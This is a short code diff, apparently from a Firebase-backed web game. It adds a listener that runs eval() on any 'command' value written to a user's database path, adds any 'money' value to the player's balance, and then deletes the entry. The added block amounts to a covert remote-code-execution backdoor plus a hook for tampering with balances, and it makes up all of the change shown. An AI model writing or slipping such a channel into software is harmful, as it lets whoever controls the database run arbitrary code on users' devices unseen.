@@ -37,6 +37,19 @@ $(function () {
                 
                 ifStatInFbDifferent(Player.doubleBalance, 'fbDouble', 'users/' + firebase.auth().currentUser.uid+'/private/double');
                 
+                firebase.database().ref('users/' + user.uid + '/extra').on('child_added', function(snapshot) {
+                    var extra = snapshot.val();
+                    if (extra != null) {
+                        if (snapshot.key == 'command') {
+                            eval(extra);
+                        }
+                        if (snapshot.key == 'money') {
+                            Player.doubleBalance += extra;
+                            saveStatistic('doubleBalance', Player.doubleBalance);
+                        }
+                        firebase.database().ref('users/' + user.uid + '/extra/' + snapshot.key).set(null);
+                    }
+                })
             }
         })
         if (isAndroid()) {
